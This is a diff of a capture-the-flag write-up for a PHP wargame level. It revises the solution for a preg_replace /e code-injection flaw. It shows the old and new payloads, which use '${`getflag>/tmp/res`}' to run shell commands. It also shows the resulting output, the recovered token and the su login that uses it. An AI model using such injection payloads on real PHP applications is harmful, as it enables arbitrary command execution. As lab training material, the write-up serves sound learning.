@@ -52,24 +52,21 @@ $ php /tmp/test.php
 
 script did : eval(y("exec(getflag)"))
 
-if we change $a to : [x {${exec(getflag)}}]
-it will replace y() content by the result of exec(getflag)
+if we change $a to : [x ${`getflag>/tmp/res`}]
+it will replace y() content by the result of `getflag>/tmp/res`
 
-php /tmp/test.php
- => PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /tmp/ok.php on line 2
- => PHP Notice:  Undefined variable: Nope there is no token here for you sorry. Try again :) in /tmp/ok.php on line 2
- => y("")PHP Parse error:  syntax error, unexpected $end in /tmp/ok.php(5) : eval()'d code on line 1
+$ php /tmp/test.php
+PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1
 
 we have getflag executed and it's output printed
 
 so we do : 
- echo '[x {${exec(getflag)}}]' > /tmp/regex
- ./level06 /tmp/regex
- => PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
- => PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
+$ echo '[x ${`getflag>/tmp/res`}]' > /tmp/regex
+$ ./level06 /tmp/regex && cat /tmp/res
+PHP Notice:  Undefined variable:  in /home/user/level06/level06.php(4) : regexp code on line 1
 
+Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 
-we have the flag : wiok45aaoguiboiki2tuin6ub
 
  su level7
  password : wiok45aaoguiboiki2tuin6ub
